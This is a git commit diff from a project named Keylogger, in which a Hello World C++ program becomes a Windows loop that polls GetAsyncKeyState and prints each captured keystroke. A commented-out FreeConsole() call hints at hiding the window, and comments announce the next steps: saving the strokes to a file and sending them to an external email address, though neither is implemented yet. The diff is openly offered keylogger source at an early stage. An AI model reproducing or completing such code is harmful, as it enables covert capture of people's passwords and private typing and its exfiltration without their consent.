700eab64855ba6af1c7136ec530656fc3af88efb
andrea-muresan <andreasimina.muresan@gmail.com>
2023-11-30 17:59:21 +0200

    Sense keystrokes and display them

--- Keylogger/Keylogger/main.cpp
+++ Keylogger/Keylogger/main.cpp
@@ -1,6 +1,24 @@
 #include <iostream>
+#include <windows.h>
 
 int main()
 {
-    std::cout << "Hello World!\n";
+    // FreeConsole();
+
+    while (true) {
+        Sleep(30);
+
+        // Sense keystrokes and display them
+        for (int i = 32; i < 127; i++) {
+            int keyState = GetAsyncKeyState(i);
+            
+            if (keyState == -32767) {
+                std::cout << (char) i;
+            }
+        }
+
+        // Save the strokes into a text file
+
+        // Send text to an external email
+    }
 }
